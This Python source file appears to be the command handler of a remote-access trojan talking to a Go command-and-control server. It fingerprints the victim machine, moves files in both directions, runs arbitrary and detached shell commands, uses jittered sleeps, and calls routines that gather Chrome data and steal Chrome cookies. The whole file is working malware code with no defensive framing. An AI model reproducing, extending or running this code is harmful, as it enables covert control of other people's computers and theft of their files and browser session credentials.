import platform
import getpass
import os
import subprocess
from typing import List, Tuple, Union
import base64
import time
import random
import io

import config
import util
import auto



def process_info():
    user = getpass.getuser()
    host = os.uname().nodename if hasattr(os, 'uname') else platform.node()
    os_name = platform.system()
    arch = platform.machine()

    data = [
        user.encode(),
        host.encode(),
        os_name.encode(),
        arch.encode(),
        config.DAEMON_VERSION0501.encode()
    ]

    return config.MSG_INFO0501, data

def process_upload(data):
    path = data[0].decode()
    buf = io.BytesIO(data[1])  # Simulating the buffer from []byte

    err = util.decompress_0501(buf, path)

    if err is None:
        log = f"{path} : {len(data[1])}"
        state = config.LOG_SUCCESS0501
    else:
        log = f"{path} : {str(err)}"
        state = config.LOG_FAIL0501

    return config.MSG_LOG0501, [
        state.encode(),
        log.encode()
    ]

def process_download(data):
    path = data[0].decode()
    file = os.path.basename(path)

    try:
        if os.path.isdir(path):
            buf = util.compress_0501([path], compress_root=False)
            file += ".tar.gz"
            file_data = buf.read()
        else:
            with open(path, "rb") as f:
                file_data = f.read()

        return config.MSG_FILE0501, [
            config.LOG_SUCCESS0501.encode(),
            file.encode(),
            file_data
        ]

    except Exception as err:
        return config.MSG_FILE0501, [
            config.LOG_FAIL0501.encode(),
            str(err).encode()
        ]


async def process_os_shell(data: List[bytes]) -> Tuple[str, List[bytes]]:

    mode = data[0].decode()  # mode
    raw_timeout_ns = int(data[1].decode(), 16)
    timeout_sec = raw_timeout_ns / 1_000_000_000
    shell = data[2].decode()
    args = [arg.decode() for arg in data[3:]]
    
    if mode == config.SHELL_MODE_WAITGETOUT0501:
        try:
            result = subprocess.run(
                [shell] + args,
                capture_output=True,
                text=False,
                timeout=timeout_sec
            )
            return config.MSG_LOG0501, [
                config.LOG_SUCCESS0501.encode(),
                result.stdout
            ]
        except subprocess.TimeoutExpired as e:
            return config.MSG_LOG0501, [
                config.LOG_FAIL0501.encode(),
                f"Timeout: {str(e)}".encode()
            ]
        except subprocess.SubprocessError as e:
            return config.MSG_LOG0501, [
                config.LOG_FAIL0501.encode(),
                str(e).encode()
            ]

    else:
        try:
            subprocess.Popen(
                [shell] + args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True  # Detach process
            )
            return config.MSG_LOG0501, [
                config.LOG_SUCCESS0501.encode(),
                f"{shell} {' '.join(args)}".encode()
            ]
        except Exception as e:
            return config.MSG_LOG0501, [
                config.LOG_FAIL0501.encode(),
                str(e).encode()
            ]


def process_wait(data):
    hex_str = data[0].decode()
    duration_ns = int(hex_str, 16)
    duration_sec = duration_ns / 1_000_000_000  # convert ns -> s ns from go server
    duration_sec = min(duration_sec, config.MAX_SLEEP0501)  # prevent absurd sleeps
    duration = random.uniform(config.MIN_SLEEP0501, duration_sec)
    time.sleep(duration)

    send_data = os.urandom(128)
    return config.MSG_PING0501, [send_data]


def process_exit():
    return config.MSG_LOG0501, [
        config.LOG_SUCCESS0501.encode(),
        b"exited"
    ]


def process_auto(data: List[bytes]) -> Tuple[str, List[bytes]]:
    mode = data[0].decode()  # Convert bytes to string

    if mode == config.AUTO_CHROME_GATHER_COMMAND0501:
        msg_type, msg_data = auto.auto_mode_chrome_gather()
    elif mode == config.AUTO_CHROME_COOKIE_COMMAND0501:
        msg_type, msg_data = auto.auto_mode_chrome_cookie()
    else:
        msg_type = config.MSG_LOG0501
        msg_data = [config.LOG_FAIL0501.encode(), b"unknown auto mode"]

    return msg_type, msg_data


COMMAND_STACK_TOKEN = ' '  # Change this to match your Go value

def make_msg0501(msg_id: str, reqtype: str, data: List[List[bytes]]) -> str:
    # Encode the id and request type
    encoded = [msg_id, base64.b64encode(reqtype.encode()).decode()]

    # Encode each element in data
    for elem in data:
        encoded.append(base64.b64encode(elem).decode())

    # Join all encoded strings with the token
    return COMMAND_STACK_TOKEN.join(encoded)


def decode_msg0501(msg: str) -> Tuple[str, Union[List[bytes], None]]:
    encoded = msg.split(COMMAND_STACK_TOKEN)

    # Decode the first part as msg type
    msgtype = base64.b64decode(encoded[0]).decode()

    if len(encoded) == 1:
        return msgtype, None

    # Decode the rest as data
    data = [base64.b64decode(elem) for elem in encoded[1:]]

    return msgtype, data